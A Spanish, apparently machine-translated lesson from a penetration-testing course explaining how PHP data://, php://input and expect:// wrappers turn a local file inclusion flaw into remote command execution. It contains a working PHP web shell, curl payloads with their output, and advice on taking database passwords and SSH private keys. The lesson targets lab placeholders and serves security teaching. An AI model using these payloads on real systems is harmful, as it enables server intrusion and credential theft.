# PHP Wrappers

Hasta ahora en este módulo, hemos estado explotando vulnerabilidades de inclusión de archivos para revelar archivos locales a través de varios métodos. A partir de esta sección, comenzaremos a aprender cómo podemos usar vulnerabilidades de inclusión de archivos para ejecutar código en los servidores de back-end y obtener control sobre ellos.

Podemos usar muchos métodos para ejecutar comandos remotos, cada uno de los cuales tiene un caso de uso específico, ya que dependen del lenguaje/marco de fondo y las capacidades de la función vulnerable. Un método fácil y común para obtener control sobre el servidor de back-end es enumerando las credenciales de los usuarios y las claves SSH, y luego usarlos para iniciar sesión en el servidor de back-end a través de SSH o cualquier otra sesión remota. Por ejemplo, podemos encontrar la contraseña de la base de datos en un archivo como`config.php`, que puede coincidir con la contraseña de un usuario en caso de que reutilicen la misma contraseña. O podemos verificar el`.ssh`directorio en el directorio de inicio de cada usuario, y si los privilegios de lectura no se configuran correctamente, entonces podemos obtener su clave privada (`id_rsa`) y úsalo para ssh en el sistema.

Además de tales métodos triviales, hay formas de lograr la ejecución de código remoto directamente a través de la función vulnerable sin depender de la enumeración de datos o los privilegios de archivos locales. En esta sección, comenzaremos con la ejecución de código remoto en aplicaciones web de PHP. Construiremos sobre lo que aprendimos en la sección anterior y utilizaremos diferentes`PHP Wrappers`Para obtener la ejecución del código remoto. Luego, en las próximas secciones, aprenderemos otros métodos para obtener la ejecución de código remoto que también se pueden usar con PHP y otros idiomas.

---

# **Datos**

El[datos](https://www.php.net/manual/en/wrappers.data.php)El envoltorio se puede usar para incluir datos externos, incluido el código PHP. Sin embargo, el envoltorio de datos solo está disponible para usar si (`allow_url_include`) La configuración está habilitada en las configuraciones de PHP. Por lo tanto, confirmemos primero si esta configuración está habilitada, leyendo el archivo de configuración de PHP a través de la vulnerabilidad de LFI.

### **Verificación de configuraciones de PHP**

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en (`/etc/php/X.Y/apache2/php.ini`) para apache o at (`/etc/php/X.Y/fpm/php.ini`) para nginx, donde`X.Y`es su versión de instalación de PHP. Podemos comenzar con la última versión de PHP y probar versiones anteriores si no pudimos localizar el archivo de configuración. También usaremos el`base64`Filtro que usamos en la sección anterior, como`.ini`Los archivos son similares a`.php`archivos y deben estar codificados para evitar romper. Finalmente, usaremos curl o eructo en lugar de un navegador, ya que la cadena de salida podría ser muy larga y deberíamos poder capturarlo correctamente:

Envoltorios PHP

```
xnoxos@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">

```

Una vez que tenemos la cadena codificada base64, podemos decodificarla y`grep`para`allow_url_include`Para ver su valor:

Envoltorios PHP

```
xnoxos@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_includeallow_url_include = On

```

¡Excelente! Vemos que tenemos esta opción habilitada, para que podamos usar el`data`envoltura. Saber cómo verificar el`allow_url_include`La opción puede ser muy importante, como`this option is not enabled by default`, y se requiere para varios otros ataques LFI, como usar el`input`envoltura o para cualquier ataque RFI, como veremos a continuación. No es raro ver esta opción habilitada, ya que muchas aplicaciones web dependen de ella para funcionar correctamente, como algunos complementos y temas de WordPress, por ejemplo.

### **Ejecución de código remoto**

Con`allow_url_include`habilitado, podemos continuar con nuestro`data`Ataque de envoltura. Como se mencionó anteriormente, el`data`El envoltorio se puede usar para incluir datos externos, incluido el código PHP. También podemos pasarlo`base64`cadenas codificadas con`text/plain;base64`, y tiene la capacidad de decodificarlos y ejecutar el código PHP.

Entonces, nuestro primer paso sería codificar un shell web básico de PHP, como sigue:

Envoltorios PHP

```
xnoxos@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

También podemos usar curl para el mismo ataque, como sigue:

Envoltorios PHP

```
xnoxos@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid            uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

# **Aporte**

Similar al`data`envoltura, el[aporte](https://www.php.net/manual/en/wrappers.php.php)El envoltorio se puede usar para incluir la entrada externa y ejecutar el código PHP. La diferencia entre él y el`data`El envoltorio es que pasamos nuestra opinión al`input`envoltura como datos de solicitud de publicación. Por lo tanto, el parámetro vulnerable debe aceptar solicitudes posteriores para que este ataque funcione. Finalmente, el`input`Wrapper también depende de la`allow_url_include`configuración, como se mencionó anteriormente.

Para repetir nuestro ataque anterior pero con el`input`Wrapper, podemos enviar una solicitud de publicación a la URL vulnerable y agregar nuestro shell web como datos post. Para ejecutar un comando, lo pasaríamos como un parámetro Get, como lo hicimos en nuestro ataque anterior:

Envoltorios PHP

```
xnoxos@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid            uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

**Nota:**Para aprobar nuestro comando como una solicitud GET, necesitamos que la función vulnerable también acepte la solicitud GET (es decir, uso`$_REQUEST`). Si solo acepta solicitudes de publicación, entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un shell web dinámico (por ejemplo,`<\?php system('id')?>`)

---

# **Esperar**

Finalmente, podemos utilizar el[esperar](https://www.php.net/manual/en/wrappers.expect.php)Wrapper, que nos permite ejecutar comandos directamente a través de transmisiones de URL. Espere funciona de manera muy similar a los shells web que hemos utilizado anteriormente, pero no necesita proporcionar un shell web, ya que está diseñado para ejecutar comandos.

Sin embargo, la esperanza es un envoltorio externo, por lo que debe instalarse manualmente y habilitarse en el servidor de back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad central, por lo que podemos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor de back-end tal como lo hicimos con`allow_url_include`antes, pero lo haríamos`grep`para`expect`En su lugar, y si está instalado y habilitado, obtendríamos lo siguiente:

Envoltorios PHP

```
xnoxos@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expectextension=expect

```

Como podemos ver, el`extension`La palabra clave de configuración se utiliza para habilitar el`expect`Módulo, lo que significa que deberíamos poder usarlo para obtener RCE a través de la vulnerabilidad de LFI. Para usar el módulo esperado, podemos usar el`expect://`envoltura y luego pasar el comando que queremos ejecutar, como sigue:

Envoltorios PHP

```
xnoxos@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Como podemos ver, ejecutar comandos a través del`expect`El módulo es bastante sencillo, ya que este módulo fue diseñado para la ejecución de comandos, como se mencionó anteriormente. El[Ataques web](https://academy.hackthebox.com/module/details/134)El módulo también cubre el uso del`expect`Módulo con XXE Vulnerabilidades, por lo que si tiene una buena comprensión de cómo usarlo aquí, debe configurarse para usarlo con XXE.

Estos son los tres envoltorios PHP más comunes para ejecutar directamente los comandos del sistema a través de las vulnerabilidades de LFI. También cubriremos el`phar`y`zip`Envolturas en las próximas secciones, que podemos usar con aplicaciones web que permiten que las cargas de archivos obtengan una ejecución remota a través de vulnerabilidades de LFI.